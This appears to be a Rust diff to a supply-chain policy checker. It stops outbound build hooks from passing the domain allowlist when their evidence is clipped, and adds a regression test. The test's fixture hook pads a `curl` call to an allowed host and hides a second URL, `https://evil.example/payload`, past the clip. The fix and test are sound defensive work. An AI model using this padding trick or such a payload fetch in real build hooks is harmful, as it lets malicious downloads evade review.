@@ -448,8 +448,13 @@ fn consider_secrets(
     }
 }
 
+/// Host allowlist for outbound hook evidence.
+///
+/// Evidence is clipped at 120 characters and then ends with `…`. A second host
+/// past that clip is invisible here, so clipped evidence is never allowlisted.
+/// A short hook whose only hosts are listed is suppressed.
 fn domain_allowed(evidence: &str, allow: &[String]) -> bool {
-    if allow.is_empty() {
+    if allow.is_empty() || evidence.contains('…') {
         return false;
     }
     let hosts = extract_hosts(evidence);
@@ -745,6 +750,38 @@ mod tests {
                 .violations
                 .iter()
                 .all(|item| item.rule != "no_outbound_build")
+        );
+    }
+
+    #[test]
+    fn clipped_evidence_is_not_allowlisted() {
+        let mut policy = Policy::default_policy().unwrap();
+        policy.rules.no_outbound_build.allow_domains = vec!["allowed.example".to_owned()];
+        let mut raw = String::from("curl https://allowed.example/");
+        raw.push_str(&"a".repeat(120));
+        raw.push_str(" https://evil.example/payload");
+        let outbound = hook("pkg", &raw);
+        let heuristics = evaluate(std::slice::from_ref(&outbound));
+        assert!(
+            heuristics
+                .iter()
+                .any(|finding| finding.evidence.contains('…'))
+        );
+        let decision = decide(
+            &policy,
+            Evaluation {
+                graph: &graph(),
+                hooks: &[outbound],
+                heuristics: &heuristics,
+                advisories: &empty_advisories(),
+                baseline: None,
+            },
+        );
+        assert!(
+            decision
+                .violations
+                .iter()
+                .any(|item| item.rule == "no_outbound_build")
         );
     }
 
